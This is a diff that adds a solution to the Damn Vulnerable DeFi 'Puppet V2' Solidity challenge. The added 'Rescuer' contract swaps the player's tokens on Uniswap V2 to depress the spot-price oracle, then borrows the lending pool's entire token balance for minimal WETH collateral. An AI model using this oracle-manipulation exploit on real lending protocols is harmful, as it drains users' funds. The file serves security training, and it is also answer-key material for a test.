@@ -98,7 +98,18 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        Rescuer rescuer = new Rescuer{value: PLAYER_INITIAL_ETH_BALANCE}(
+            token,
+            lendingPool,
+            uniswapV2Exchange,
+            uniswapV2Router,
+            weth,
+            recovery
+        );
+
+        token.transfer(address(rescuer), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        rescuer.rescue();
     }
 
     /**
@@ -108,4 +119,76 @@ contract PuppetV2Challenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
         assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+
+contract Rescuer {
+    DamnValuableToken public token;
+    PuppetV2Pool public lendingPool;
+    IUniswapV2Pair uniswapV2Exchange;
+    IUniswapV2Router02 uniswapV2Router;
+    address public recovery;
+    WETH weth;
+
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
+
+    constructor(DamnValuableToken _token,
+                PuppetV2Pool _lendingPool,
+                IUniswapV2Pair _uniswapV2Exchange,
+                IUniswapV2Router02 _uniswapV2Router,
+                WETH _weth,
+                address _recovery
+    ) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV2Exchange = _uniswapV2Exchange;
+        uniswapV2Router = _uniswapV2Router;
+        weth = _weth;
+        recovery = _recovery;
+    }
+
+    function rescue() external {
+        token.approve(address(uniswapV2Router), type(uint256).max);
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE, // amountIn
+            1, // amountOutMin
+            path,
+            address(this), // to
+            block.timestamp + 10 // deadline
+        );
+
+        (uint112 reserve0, uint112 reserve1, ) = uniswapV2Exchange.getReserves();
+        address token0 = uniswapV2Exchange.token0();
+
+        uint256 price; // price of token in WETH, using reserves from the exchange
+        if (token0 == address(token)) {
+            price = (uint256(reserve1) * 1 ether) / uint256(reserve0);
+        } else {
+            price = (uint256(reserve0) * 1 ether) / uint256(reserve1);
+        }
+
+
+        console.log("Oracle price (1 token per ETH): ", price);
+
+        weth.deposit{value: address(this).balance}();
+
+        weth.approve(address(lendingPool), type(uint256).max);
+
+        lendingPool.borrow(1_000_000 ether);
+
+        require(token.balanceOf(address(lendingPool)) == 0, "All tokens should have been borrowed");
+
+        token.transfer(recovery, token.balanceOf(address(this)));
+
+        weth.transfer(msg.sender, weth.balanceOf(address(this)));
+
+    }
+
+    receive()external payable {}
 }
